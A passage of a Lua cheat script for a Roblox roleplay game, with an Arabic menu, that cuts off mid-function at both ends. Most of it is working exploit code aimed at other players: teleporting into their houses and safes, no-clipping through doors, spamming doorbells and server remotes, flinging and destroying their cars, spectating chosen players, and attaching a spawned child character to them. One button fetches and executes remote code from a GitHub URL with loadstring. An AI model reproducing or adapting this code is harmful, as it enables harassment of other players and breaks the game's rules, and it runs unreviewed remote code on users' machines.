    if v:IsA("Tool") then
      v.Parent = game.Players.LocalPlayer.Character
    end
  end
end
equiptool()
  end
})
TabSp:AddSection({"الاشكال والمباني"})
SelectedTool = "Laptop"
Shape = "دائرة"
Radius = 15
Height = 20
 CollectedTools = {}
 ToolOffsets = {}
TabSp:AddTextBox({
    Name = "المسافة",
    Default = tostring(Radius),
    TextDisappear = false,
    Callback = function(v)
        local n = tonumber(v)
        if n then Radius = math.abs(n) end
    end
})
TabSp:AddTextBox({
    Name = "الارتفاع",
    Default = tostring(math.abs(Height)),
    TextDisappear = false,
    Callback = function(v)
        local n = tonumber(v)
        if n then
            Height = -math.abs(n)
            for tool, offset in pairs(ToolOffsets) do
                tool.GripPos = Vector3.new(offset.X, Height, offset.Z)
                ToolOffsets[tool] = Vector3.new(offset.X, Height, offset.Z)
            end
        end
    end
})
TabSp:AddDropdown({
    Name = "الاداة",
    Options = {"Laptop", "Iphone", "FireX"},
    Default = SelectedTool,
    Callback = function(v) SelectedTool = v end
})
TabSp:AddDropdown({
    Name = "الشكل",
    Options = {"دائرة", "مكعب", "كرة", "جناح"},
    Default = Shape,
    Callback = function(v) Shape = v end
})
function getTools()
     char = player.Character or player.CharacterAdded:Wait()
     backpack = player:WaitForChild("Backpack")
     tools = {}
    for _, v in pairs(char:GetChildren()) do
        if v:IsA("Tool") and v.Name == SelectedTool then
            table.insert(tools, v)
        end
    end
    for _, v in pairs(backpack:GetChildren()) do
        if v:IsA("Tool") and v.Name == SelectedTool then
            table.insert(tools, v)
        end
    end
    return tools
end

 function organizarItens()
     char = player.Character or player.CharacterAdded:Wait()
     root = char:WaitForChild("HumanoidRootPart")
     head = char:FindFirstChild("Head") or root
     tools = getTools()
    if #tools == 0 then return end

    CollectedTools = tools
    ToolOffsets = {}

     center = head.Position
     count = #tools
    if Shape == "دائرة" then
         step = (2 * math.pi) / count
        for i, tool in ipairs(tools) do
             angle = step * (i - 1)
             offset = Vector3.new(
                math.cos(angle) * Radius,
                Height,
                math.sin(angle) * Radius
            )
            tool.Parent = char
            tool.GripPos = offset
            tool.Parent = player.Backpack
            ToolOffsets[tool] = offset
        end

    elseif Shape == "مكعب" then
         s = math.ceil(count ^ (1/3))
         gap = (Radius * 2) / math.max(s - 1, 1)
         idx = 1
        for x = 0, s - 1 do
            for y = 0, s - 1 do
                for z = 0, s - 1 do
                    if idx > count then break end
                     offset = Vector3.new(
                        -Radius + x * gap,
                        -Radius + y * gap + Height,
                        -Radius + z * gap
                    )
                     tool = tools[idx]
                    tool.Parent = char
                    tool.GripPos = offset
                    tool.Parent = player.Backpack
                    ToolOffsets[tool] = offset
                    idx += 1
                end
            end
        end

    elseif Shape == "كرة" then
         idx = 1
         stepA = math.pi / math.ceil(count^(1/2))
        local stepB = (2 * math.pi) / math.ceil(count^(1/2))
        for a = 0, math.pi, stepA do
            for b = 0, 2 * math.pi, stepB do
                if idx > count then break end
                 offset = Vector3.new(
                    math.sin(a) * math.cos(b) * Radius,
                    math.cos(a) * Radius + Height,
                    math.sin(a) * math.sin(b) * Radius
                )
                 tool = tools[idx]
                tool.Parent = char
                tool.GripPos = offset
                tool.Parent = player.Backpack
                ToolOffsets[tool] = offset
                idx += 1
            end
        end
    elseif Shape == "جناح" then
         half = math.ceil(count / 2)
        for i, tool in ipairs(tools) do
             side = (i <= half) and -1 or 1
             idx = (side == -1) and i or (i - half)
             angle = math.rad(idx * 12)
             offset = Vector3.new(
                math.cos(angle) * Radius * side,
                math.sin(angle) * Radius + Height,
                -idx * 1.2
            )
            tool.Parent = char
            tool.GripPos = offset
            tool.Parent = player.Backpack
            ToolOffsets[tool] = offset
        end
    end
end

TabSp:AddButton({
    Name = "تفعيل الشكل",
    Callback = organizarItens
})
 OrbitToggle = false
 OrbitAngle = 0
TabSp:AddToggle({
    Name = "دوران الأدوات",
    Default = false,
    Callback = function(state)
        OrbitToggle = state
        if not state then return end
        task.spawn(function()
            while OrbitToggle do
                 char = player.Character
                 root = char and char:FindFirstChild("HumanoidRootPart")
                if not root then task.wait() continue end
                OrbitAngle += math.rad(2)
                 rot = CFrame.Angles(0, OrbitAngle, 0)

                for tool, offset in pairs(ToolOffsets) do
                    if tool then
                        local rotated = rot * Vector3.new(offset.X, 0, offset.Z)
                        tool.GripPos = Vector3.new(
                            rotated.X,
                            offset.Y,
                            rotated.Z
                        )
                    end
                end

                task.wait(0.03)
            end
        end)
    end
})
LaptopLoop = false
TabSp:AddToggle({
    Name = "تجميع لابتوب",
    Default = false,
    Callback = function(state)
        LaptopLoop = state
        if not state then return end
        task.spawn(function()
            while LaptopLoop do
                 char = player.Character
                 root = char and char:FindFirstChild("HumanoidRootPart")
                if not root then task.wait() continue end
                 laptop = workspace.WorkspaceCom["001_CommercialStores"].CommercialStorage1.Store.Tools.Laptop
                 clickDetector = laptop and laptop:FindFirstChild("ClickDetector")
                if laptop and clickDetector then
                    root.CFrame = laptop.CFrame
                    fireclickdetector(clickDetector)
                end
                task.wait(0.1)
            end
        end)
    end
})
FireXLoop = false
TabSp:AddToggle({
    Name = "تجميع FireX",
    Default = false,
    Callback = function(state)
        FireXLoop = state
        if not state then return end

        task.spawn(function()
             Players = game:GetService("Players")
             player = Players.LocalPlayer

            while FireXLoop do
              
                 char = player.Character or player.CharacterAdded:Wait()
                 root = char:FindFirstChild("HumanoidRootPart")

                if not root then
                    task.wait()
                    continue
                end

                
                 fireXPath =
                    workspace.WorkspaceCom["001_DayCare"]
                    .Tools.FireX

                 clickDetector = fireXPath:FindFirstChild("ClickDetector")

                if fireXPath and clickDetector then
                
                    root.CFrame = fireXPath.CFrame
                    
                    fireclickdetector(clickDetector)
                end

                task.wait(0.01)
            end
        end)
    end
})

LocalPlayer = Players.LocalPlayer

HouseTab = Window:MakeTab({"بيت", "home"})

SelectHouse = nil
NoclipDoor = nil
HouseDropdown = nil

function GetHouseList()
    list = {}
    lots = Workspace:FindFirstChild("001_Lots")
    if lots then
        for _, house in ipairs(lots:GetChildren()) do
            if house.Name ~= "For Sale" and house:IsA("Model") then
                table.insert(list, house.Name)
            end
        end
    end
    table.sort(list)
    return list
end

HouseDropdown = HouseTab:AddDropdown({
    Name = "اختيار بيت",
    Options = GetHouseList(),
    Default = "...",
    MultSelect = false,
    Callback = function(Value)
        SelectHouse = Value
        if NoclipDoor then
            NoclipDoor:Set(false)
        end
    end
})

function UpdateHouseDropdown()
    if HouseDropdown then
        HouseDropdown:Set(GetHouseList())
        SelectHouse = nil
        HouseDropdown:SetValue("")
    end
end

HouseTab:AddButton({
    Name = "تحديث قائمة البيوت",
    Callback = function()
        UpdateHouseDropdown()
    end
})

HouseTab:AddButton({
    Name = "انتقال للبيت",
    Callback = function()
        if SelectHouse then
            house = Workspace["001_Lots"]:FindFirstChild(SelectHouse)
            if house and LocalPlayer.Character then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(house.WorldPivot.Position)
            end
        end
    end
})

HouseTab:AddButton({
    Name = "انتقال للخزنة",
    Callback = function()
        if SelectHouse then
            house = Workspace["001_Lots"]:FindFirstChild(SelectHouse)
            if house and house:FindFirstChild("HousePickedByPlayer") and LocalPlayer.Character then
                safe = house.HousePickedByPlayer.HouseModel:FindFirstChild("001_Safe")
                if safe then
                    LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(safe.WorldPivot.Position)
                end
            end
        end
    end
})

NoclipDoor = HouseTab:AddToggle({
    Name = "اختراق الباب",
    Default = false,
    Callback = function(Value)
        if SelectHouse then
            house = Workspace["001_Lots"]:FindFirstChild(SelectHouse)
            if house and house:FindFirstChild("HousePickedByPlayer") then
                doors = house.HousePickedByPlayer.HouseModel:FindFirstChild("001_HouseDoors")
                if doors and doors:FindFirstChild("HouseDoorFront") then
                    for _, base in ipairs(doors.HouseDoorFront:GetChildren()) do
                        if base:IsA("BasePart") then
                            base.CanCollide = not Value
                        end
                    end
                end
            end
        end
    end
})

HouseTab:AddToggle({
    Name = "شغل الجرس",
    Default = false,
    Callback = function(Value)
        getgenv().AutoDoorbell = Value
        spawn(function()
            while getgenv().AutoDoorbell do
                if SelectHouse then
                    house = Workspace["001_Lots"]:FindFirstChild(SelectHouse)
                    if house and house:FindFirstChild("HousePickedByPlayer") then
                        doorbell = house.HousePickedByPlayer.HouseModel:FindFirstChild("001_DoorBell")
                        if doorbell and doorbell:FindFirstChild("TouchBell") then
                            pcall(function()
                                fireclickdetector(doorbell.TouchBell.ClickDetector)
                            end)
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

HouseTab:AddToggle({
    Name = "طرق الباب",
    Default = false,
    Callback = function(Value)
        getgenv().AutoKnockDoor = Value
        spawn(function()
            while getgenv().AutoKnockDoor do
                if SelectHouse then
                    house = Workspace["001_Lots"]:FindFirstChild(SelectHouse)
                    if house and house:FindFirstChild("HousePickedByPlayer") then
                        doors = house.HousePickedByPlayer.HouseModel:FindFirstChild("001_HouseDoors")
                        if doors and doors:FindFirstChild("HouseDoorFront") and doors.HouseDoorFront:FindFirstChild("Knock") then
                            pcall(function()
                                fireclickdetector(doors.HouseDoorFront.Knock.TouchBell.ClickDetector)
                            end)
                        end
                    end
                end
                task.wait(0.5)
            end
        end)
    end
})

Section = HouseTab:AddSection({"سبام بيتك"})  

loopSpeed = 0.2

speedSlider = HouseTab:AddSlider({
    Name = "السرعة",
    MinValue = 0.05,
    MaxValue = 1,
    Default = loopSpeed,
    Increase = 0.01,
    Callback = function(v)
        loopSpeed = v
    end
})

HouseTab:AddToggle({
    Name = "تلوين البيت",
    Default = false,
    Callback = function(state)
        colors = {
            Color3.new(1, 0, 0),
            Color3.new(0, 1, 0),
            Color3.new(0, 0, 1),
            Color3.new(1, 1, 0),
            Color3.new(0, 1, 1),
            Color3.new(1, 0, 1)
        }
        isHouseRGBActive = state
        replicatedStorage = game:GetService("ReplicatedStorage")
        remoteEvent = replicatedStorage:FindFirstChild("RE") and replicatedStorage.RE:FindFirstChild("1Player1sHous1e")
        if not remoteEvent then return end
        spawn(function()
            while isHouseRGBActive do
                for _, color in ipairs(colors) do
                    if not isHouseRGBActive then return end
                    pcall(function()
                        remoteEvent:FireServer("ColorPickHouse", color)
                    end)
                    task.wait(loopSpeed)
                end
            end
        end)
    end
})

HouseRemote = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e")

toggleLock = false
toggleBaby = false
toggleCurtains = false
toggleGarage = false

HouseTab:AddToggle({
    Name = "قفل الأبواب",
    Default = false,
    Callback = function(v)
        toggleLock = v
        task.spawn(function()
            while toggleLock do
                HouseRemote:FireServer("LockDoors")
                task.wait(loopSpeed)
            end
        end)
    end
})

HouseTab:AddToggle({
    Name = "وضع الأطفال",
    Default = false,
    Callback = function(v)
        toggleBaby = v
        task.spawn(function()
            while toggleBaby do
                HouseRemote:FireServer("BabyOptionYes")
                task.wait(loopSpeed)
            end
        end)
    end
})

HouseTab:AddToggle({
    Name = "الستائر",
    Default = false,
    Callback = function(v)
        toggleCurtains = v
        task.spawn(function()
            while toggleCurtains do
                HouseRemote:FireServer("Curtains")
                task.wait(loopSpeed)
            end
        end)
    end
})

HouseTab:AddToggle({
    Name = "باب الكراج",
    Default = false,
    Callback = function(v)
        toggleGarage = v
        task.spawn(function()
            while toggleGarage do
                HouseRemote:FireServer("GarageDoor")
                task.wait(loopSpeed)
            end
        end)
    end
})

CarTab = Window:MakeTab({"السيارة", "rbxassetid://10723415903"})

spammingHeadLights = false
spammingHazardLights = false
spammingHorn = false

ReplicatedStorage = game:GetService("ReplicatedStorage")

function spamHeadLights()
    while spammingHeadLights do
        ReplicatedStorage.Remotes.ToggleHeadLights:InvokeServer()
        wait(0.1)
    end
end

function spamHazardLights()
    while spammingHazardLights do
        ReplicatedStorage.Remotes.ToggleHazardLights:InvokeServer()
        wait(0.1)
    end
end
function spamPlayHorn()
    while spammingHorn do
        ReplicatedStorage.Remotes.PlayHorn:InvokeServer()
        wait(0.1)
    end
end


CarTab:AddSection({ "السبام" })
CarTab:AddToggle({
    Name = "تلوين السيارة",
    Default = false,
    Callback = function(state)
        isColorChanging = state
        if isColorChanging then
            colorChangeCoroutine = coroutine.create(changeCarColor)
            coroutine.resume(colorChangeCoroutine)
        end
    end
})

CarTab:AddToggle({
    Name = "سبام اضواء سيارة",
    Default = false,
    Callback = function(value)
        spammingHeadLights = value
        if spammingHeadLights then
            spawn(spamHeadLights)
        else
            wait(0.2)
            ReplicatedStorage.Remotes.ToggleHeadLights:InvokeServer()
        end
    end
})

CarTab:AddToggle({
    Name = "سبام اشارات السيارة",
    Default = false,
    Callback = function(value)
        spammingHazardLights = value
        if spammingHazardLights then
            spawn(spamHazardLights)
        else

            wait(0.2)
            ReplicatedStorage.Remotes.ToggleHazardLights:InvokeServer()
        end
    end
})

CarTab:AddToggle({
    Name = "سبام هورن(بوري)",
    Default = false,
    Callback = function(value)
        spammingHorn = value
        if spammingHorn then
            spawn(spamPlayHorn)
        else
            ReplicatedStorage.Remotes.StopHorn:InvokeServer()
        end
    end
})


CarTab:AddSection({ "سرعة السيارة & التيربو" })

local speedValue = 200
local turboValue = 11.3

function getAllCars()
    local cars = {}
    if workspace.Vehicles then
        for _, vehicle in pairs(workspace.Vehicles:GetChildren()) do
            if vehicle:FindFirstChild("Seats") and vehicle.Seats:FindFirstChild("VehicleSeat") then
                table.insert(cars, vehicle)
            end
        end
    end
    return cars
end

function applyToAllCars(valueType, value)
    cars = getAllCars()
    carsModified = 0
    
    if #cars == 0 then
        print(" لايوجد سيارات يا مدري مين!")
        return
    end
    
    for _, vehicle in pairs(cars) do
        vehicleSeat = vehicle.Seats.VehicleSeat
        print(" : " .. vehicle.Name)
        
        print(" VehicleSeat:")
        for _, child in pairs(vehicleSeat:GetChildren()) do
            print("  - " .. child.Name .. " (" .. child.ClassName .. ")")
        end
        
        targetObj = vehicleSeat:FindFirstChild(valueType)
        
        if targetObj then
            print(" Encontrou " .. valueType .. " (" .. targetObj.ClassName .. ")")
            
            if targetObj:IsA("NumberValue") then
                targetObj.Value = value
                carsModified = carsModified + 1
                print(" " .. valueType .. " (NumberValue) alterado para " .. value)
            elseif targetObj:IsA("IntValue") then
                targetObj.Value = value
                carsModified = carsModified + 1
                print(" " .. valueType .. " (IntValue) alterado para " .. value)
            elseif targetObj:IsA("StringValue") then
                targetObj.Value = tostring(value)
                carsModified = carsModified + 1
                print(" " .. valueType .. " (StringValue) alterado para " .. value)
            else
                print(" " .. valueType .. "  " .. targetObj.ClassName)
            
                pcall(function()
                    targetObj.Value = value
                    carsModified = carsModified + 1
                    print(" " .. valueType .. " alterado diretamente para " .. value)
                end)
            end
        else
            print(" " .. valueType .. " VehicleSeat")
            
            success = pcall(function()
                if valueType == "MaxSpeed" then
                    vehicleSeat.MaxSpeed = value
                elseif valueType == "Turbo" then
                    vehicleSeat.Turbo = value
                end
                carsModified = carsModified + 1
                print(" " .. valueType .. " (propriedade VehicleSeat) alterado para " .. value)
            end)
            
            if not success then
                print(" Falha ao alterar " .. valueType .. " como propriedade")
            end
        end
    end
    
    print(" : " .. carsModified)
end
CarTab:AddTextBox({
    Name = "سرعة السيارة",
    Description = "لسرعات عالية تحتاج قيمباس",
    PlaceholderText = "200",
    Callback = function(Value)
        numValue = tonumber(Value)
        if numValue then
            speedValue = numValue
            print(" Velocidade definida para: " .. speedValue)
        else
            print(" Erro:")
        end
    end
})

CarTab:AddTextBox({
    Name = "رقم التيربو",
    Description = "",
    PlaceholderText = "11.3",
    Callback = function(Value)
        numValue = tonumber(Value)
        if numValue then
            turboValue = numValue
            print(" Turbo definido para: " .. turboValue)
        else
            print(" Erro: ")
        end
    end
})
CarTab:AddButton({
    Name = "تفعيل السرعة",
    Description = "ماتحتاج قيم باس",
    Callback = function()
        print("  " .. speedValue .. " ...")
        applyToAllCars("MaxSpeed", speedValue)
    end
})

CarTab:AddButton({
    Name = "تطبيق التيربو",
    Description = "",
    Callback = function()
        print(" " .. turboValue .. " ...")
        applyToAllCars("Turbo", turboValue)
    end
})

print("")

CarTab:AddSection({ "سحب السيارات & قتل السيارات" })
Players = game:GetService("Players")
Workspace = game:GetService("Workspace")
LocalPlayer = Players.LocalPlayer
Camera = Workspace.CurrentCamera
VehiclesFolder = Workspace:WaitForChild("Vehicles")

function GetCarPart(model)
for _, p in ipairs(model:GetDescendants()) do
if p:IsA("BasePart") then
return p
end
end
end

function GetCars()
list = {}
for _, v in ipairs(VehiclesFolder:GetChildren()) do
if v.Name:match("Car$") then
table.insert(list, v.Name)
end
end
return list
end

SelectedCar = nil
SavedCameraSubject = nil
CarDropdown = nil

CarDropdown = CarTab:AddDropdown({
Name = "اختار سيارة",
Options = GetCars(),
Default = {},
MultSelect = false,
Callback = function(v)
SelectedCar = v
end
})

function UpdateDropdown()
cars = GetCars()
if CarDropdown then
CarDropdown:Set(cars)
SelectedCar = nil
CarDropdown:SetValue("")
end
end

CarTab:AddButton({
Name = "تحديث السيارات",
Callback = function()
UpdateDropdown()
end
})

CarTab:AddToggle({
Name = "مشاهدة السيارة (Spectate)",
Default = false,
Callback = function(state)
if state then
if not SelectedCar then return warn("اختر سيارة أولاً.") end
car = VehiclesFolder:FindFirstChild(SelectedCar)
if not car then return end
part = GetCarPart(car)
if not part then return end
SavedCameraSubject = Camera.CameraSubject
Camera.CameraSubject = part
else
if SavedCameraSubject then
Camera.CameraSubject = SavedCameraSubject
SavedCameraSubject = nil
end
end
end
})

CarTab:AddButton({
Name = "الانتقال إلى السيارة",
Callback = function()
if not SelectedCar then return warn("اختر سيارة أولاً.") end
car = VehiclesFolder:FindFirstChild(SelectedCar)
if not car then return end
part = GetCarPart(car)
if not part then return end
char = LocalPlayer.Character
if char and char:FindFirstChild("HumanoidRootPart") then
char.HumanoidRootPart.CFrame = part.CFrame + Vector3.new(0, 5, 0)
end
end
})

methodKill = nil

CarTab:AddDropdown({
Name = "اختار طريقة فلنق",
Options = {"باص", "كرة"},
Default = "",
Callback = function(v)
methodKill = v
end
})

CarTab:AddButton({
Name = "فلنق السيارة",
Callback = function()
if not SelectedCar then return warn("اختر سيارة أولاً!") end
car = workspace.Vehicles:FindFirstChild(SelectedCar)
if not car then return warn("السيارة غير موجودة.") end
if methodKill == "كرة" then
FlingBall(car)
elseif methodKill == "باص" then
BusAttack(car)
else
warn("اختر طريقة القتل أولاً!")
end
end
})

function FlingBall(targetCar)
player = Players.LocalPlayer
character = player.Character or player.CharacterAdded:Wait()
humanoid = character:WaitForChild("Humanoid")
hrp = character:WaitForChild("HumanoidRootPart")
backpack = player:WaitForChild("Backpack")
ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

function GetBall()
if not backpack:FindFirstChild("SoccerBall") then
game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
end
repeat task.wait() until backpack:FindFirstChild("SoccerBall")
backpack.SoccerBall.Parent = character
repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)
character.SoccerBall.Parent = backpack
return ServerBalls:FindFirstChild("Soccer" .. player.Name)
end

Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()
Ball.CanCollide = false
Ball.Massless = true
Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

tpart = nil
for _, v in ipairs(targetCar:GetDescendants()) do
if v:IsA("BasePart") then
tpart = v
break
end
end
if not tpart then return end

bvExist = Ball:FindFirstChildWhichIsA("BodyVelocity")
if bvExist then bvExist:Destroy() end

bv = Instance.new("BodyVelocity")
bv.Name = "FlingPower"
bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
bv.P = 9e900
bv.Parent = Ball

repeat
Ball.CFrame = tpart.CFrame
Ball.Orientation += Vector3.new(45, 60, 30)
task.wait(1/6000)
until not targetCar.Parent

workspace.CurrentCamera.CameraSubject = humanoid
end

function BusAttack(targetCar)
ReplicatedStorage = game:GetService("ReplicatedStorage")
Players = game:GetService("Players")
LocalPlayer = Players.LocalPlayer
RunService = game:GetService("RunService")
character = LocalPlayer.Character
humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
if not humanoidRootPart then return end

function GetBus()
vehicles = workspace:FindFirstChild("Vehicles")
return vehicles and vehicles:FindFirstChild(LocalPlayer.Name .. "Car")
end

bus = GetBus()
if not bus then
humanoidRootPart.CFrame = CFrame.new(1118.81, 75.998, -1138.61)
task.wait(0.5)
re = ReplicatedStorage:FindFirstChild("RE")
if re and re:FindFirstChild("1Ca1r") then
re["1Ca1r"]:FireServer("PickingCar", "SchoolBus")
end
task.wait(1)
bus = GetBus()
end
if not bus then return end

seat = bus:FindFirstChild("Body") and bus.Body:FindFirstChild("VehicleSeat")
if seat and character:FindFirstChild("Humanoid") then
repeat
humanoidRootPart.CFrame = seat.CFrame * CFrame.new(0, 2, 0)
task.wait(0.3)
until character.Humanoid.Sit or not bus.Parent

for _, v in pairs(bus.Body:GetChildren()) do
if v:IsA("Seat") then
v.CanTouch = false
end
end
end

function TrackCar()
while bus and targetCar.Parent do
tpart = nil
for _, p in ipairs(targetCar:GetDescendants()) do
if p:IsA("BasePart") then
tpart = p
break
end
end
if not tpart then break end

timeNow = tick() * 35
lat = math.sin(timeNow) * 4
fr = math.cos(timeNow) * 20

bus:SetPrimaryPartCFrame(tpart.CFrame * CFrame.new(lat, 0, fr))
RunService.RenderStepped:Wait()
end
end

task.spawn(TrackCar)
end

 Players = game:GetService("Players")
 TweenService = game:GetService("TweenService")

 LocalPlayer = Players.LocalPlayer
 RUN_SEAT_TEST = false
 ORIGINAL_POS = nil

CarTab:AddToggle({
    Name = "قتل السيارة",
    Default = false,
    Callback = function(state)

        if state then
            if not SelectedCar then
                warn("❌ بالاول اختارلك سيارة يا ابني!")
                return
            end

            RUN_SEAT_TEST = true
            ORIGINAL_POS = LocalPlayer.Character.HumanoidRootPart.CFrame

            workspace.FallenPartsDestroyHeight = 0/0

            task.spawn(function()
                while RUN_SEAT_TEST do
                     vehFolder = workspace:FindFirstChild("Vehicles")
                    if not vehFolder then break end

                     theCar =
vehFolder:FindFirstChild(SelectedCar)
                    if theCar and theCar:FindFirstChild("Seats") then
                         seat = theCar.Seats:FindFirstChild("VehicleSeat")
                        if seat then
                        
                            LocalPlayer.Character.HumanoidRootPart.CFrame =
                                seat.CFrame + Vector3.new(0, 3, 0)
                            task.wait(0.2)

                            pcall(function()
                                LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
                            end)
                            task.wait(0.3)
                            LocalPlayer.Character.HumanoidRootPart.CFrame =
                                seat.CFrame - Vector3.new(0, 150, 0)

                            task.wait(0.2)
                            pcall(function()
                                LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                                    :ChangeState(Enum.HumanoidStateType.Jumping)
                            end)

                            task.wait(0.4)
                        end
                    end

                    task.wait(0.1)
                end
            end)

        else
            RUN_SEAT_TEST = false

            workspace.FallenPartsDestroyHeight = -500

             HRP = LocalPlayer.Character:WaitForChild("HumanoidRootPart")

            TweenService:Create(
                HRP,
                TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                {CFrame = ORIGINAL_POS}
            ):Play()
        end
    end
})
CarTab:AddButton({
    Name = "سحب السيارة",
    Callback = function()
        if not SelectedCar then
            warn("❌ اختار سيارة يا زمال!")
            return
        end

        vehFolder = workspace:FindFirstChild("Vehicles")
        if not vehFolder then
            warn("❌ حبيبي ماكو")
            return
        end

        selectedVehicle = vehFolder:FindFirstChild(SelectedCar)
        if not selectedVehicle then
            warn("❌ السيارة المختارة ماكو!")
            return
        end

        if not selectedVehicle.PrimaryPart then
            warn("❌ سيارة اللي اختاريتها ضارط كودها")
            return
        end
hrp = game.Players.LocalPlayer.Character:GetPrimaryPartCFrame()

        selectedVehicle:SetPrimaryPartCFrame(hrp)
    end
})

CarTab:AddSection({"سحب وقتل كل السيارات"})

CarTab:AddButton({
    Name = "سحب كل السيارات",
    Callback = function()
        for _, v in next, workspace.Vehicles:GetChildren() do
            v:SetPrimaryPartCFrame(game.Players.LocalPlayer.Character:GetPrimaryPartCFrame())
        end
    end
})

CarTab:AddToggle({
    Name = "قتل كل السيارات",
    Default = false,
    Callback = function(state)

        if state then
            RUN_SEAT_TEST = true
            ORIGINAL_POS = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame

            workspace.FallenPartsDestroyHeight = 0/0

            task.spawn(function()
                while RUN_SEAT_TEST do

                    for _, plr in ipairs(game:GetService("Players"):GetPlayers()) do
                        if not RUN_SEAT_TEST then break end
                        if plr == game.Players.LocalPlayer then continue end

                         carName = plr.Name .. "Car"

                         carFolder = workspace:FindFirstChild("Vehicles")
                        if not carFolder then continue end

                         car = carFolder:FindFirstChild(carName)
                        if not car then continue end

                        if not car:FindFirstChild("Seats") then continue end

                         seatFolder = car.Seats
                         seat = seatFolder:FindFirstChild("VehicleSeat")

                        if seat then

                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                seat.CFrame + Vector3.new(0, 3, 0)
                            task.wait(0.2)

                            pcall(function()
                                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = true
                            end)
                            task.wait(0.3)

                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =
                                seat.CFrame - Vector3.new(0, 150, 0)

                            task.wait(0.2)

                            pcall(function()
                                game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
                                    :ChangeState(Enum.HumanoidStateType.Jumping)
                            end)

                            task.wait(0.4)
                        end
                    end

                    task.wait(0.1)
                end
            end)

        else
            RUN_SEAT_TEST = false
            workspace.FallenPartsDestroyHeight = -500
             TweenService = game:GetService("TweenService")
             HRP = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")

            TweenService:Create(
                HRP,
                TweenInfo.new(0.35, Enum.EasingStyle.Linear, Enum.EasingDirection.Out),
                {CFrame = ORIGINAL_POS}
            ):Play()
        end
    end
})
CarTab:AddSection({"سكربت طيران للسيارات"})
CarTab:AddButton({
    Name = "طيران السيارة",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/kllooep/Fjjzxda6/refs/heads/main/Tahakom76"))()
    end
})
ChildTab = Window:MakeTab({
    Title = "الاطفال",
    Icon = "rbxassetid://10723415903"
})
Players = game:GetService("Players") RunService = game:GetService("RunService")
ReplicatedStorage = game:GetService("ReplicatedStorage")
LocalPlayer = Players.LocalPlayer

getgenv().Selec7tedPlayerNOme = nil

function GetPlayersList()
list = {}
for _, plr in ipairs(Players:GetPlayers()) do
if plr ~= LocalPlayer then
table.insert(list, plr.Name)
end
end
if #list == 0 then
return {"لا يوجد لاعبين"}
end
return list
end

PlayerDropdown = ChildTab:AddDropdown({
Name = "اختيار اللاعب",
Options = GetPlayersList(),
Default = "لا يوجد لاعبين",
Callback = function(v)
if v == "لا يوجد لاعبين" then
getgenv().Selec7tedPlayerNOme = nil
else
getgenv().Selec7tedPlayerNOme = v
end
end
})
ChildTab:AddButton({
Name = "تحديث اللاعبين♻️",
Callback = function()
PlayerDropdown:Set(GetPlayersList())
end
})
ChildTab:AddToggle({
Name = "المراقبة",
Default = false,
Callback = function(state)
 camera = workspace.CurrentCamera

if state then  
        if not getgenv().Selec7tedPlayerNOme then return end  

        if getgenv().SpyConnection then  
            getgenv().SpyConnection:Disconnect()  
        end  

        getgenv().SpyConnection = RunService.Heartbeat:Connect(function()  
         local target = Players:FindFirstChild(getgenv().Selec7tedPlayerNOme)  
            if target and target.Character then  
                camera.CameraSubject =  
                    target.Character:FindFirstChild("Humanoid")  
                    or camera.CameraSubject  
            end  
        end)  
    else  
        if getgenv().SpyConnection then  
            getgenv().SpyConnection:Disconnect()  
            getgenv().SpyConnection = nil  
        end  

        camera.CameraSubject =  
            LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")  
            or camera.CameraSubject  
    end  
end
})
ChildTab:AddButton({
Name = "حذف الطفل🗑️",
Callback = function()
args = {
	"DeleteFollowCharacter"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Bab1yFollo1w"):FireServer(unpack(args))
end
})
ChildTab:AddToggle({
    Name = "👶ارسال الطفل",
    Default = false,
    Callback = function(state)

         pl = Players.LocalPlayer
         selectedPlayerName = getgenv().Selec7tedPlayerNOme

        if not selectedPlayerName then
            warn("No player selected!")
            return
        end

        if state then
 args = {
	"SpawnChild",
	"BabyBoy"
}
game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Bab1yFollo1w"):FireServer(unpack(args))
wait(0.8)
            if not workspace:FindFirstChild(pl.Name) or not workspace[pl.Name]:FindFirstChild("FollowCharacter") then
                 args = { "CharacterFollowSpawnPlayer", "BabyBoy" }
                 re = ReplicatedStorage.RE:FindFirstChild("1Bab1yFollo1w")
                if re then
                    re:FireServer(unpack(args))
                end
            end

            task.wait(0.2)

            if workspace:FindFirstChild(pl.Name) then
                for _, v in pairs(workspace[pl.Name]:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CanCollide = true
                    end
                end
            end

             target = selectedPlayerName

            if workspace:FindFirstChild(target)
                and workspace:FindFirstChild(pl.Name)
                and workspace[pl.Name]:FindFirstChild("FollowCharacter") then
                workspace[pl.Name].FollowCharacter.Parent = workspace[target]

                if getgenv().RunService then
                    getgenv().RunService:Disconnect()
                end

getgenv().RunService = RunService.Heartbeat:Connect(function()
                     followCharacter = workspace[target]:FindFirstChild("FollowCharacter")
                     humanoidRootPart = workspace[target]:FindFirstChild("HumanoidRootPart")

                    if followCharacter
                        and followCharacter:FindFirstChild("Torso")
                        and followCharacter.Torso:FindFirstChild("BodyPosition")
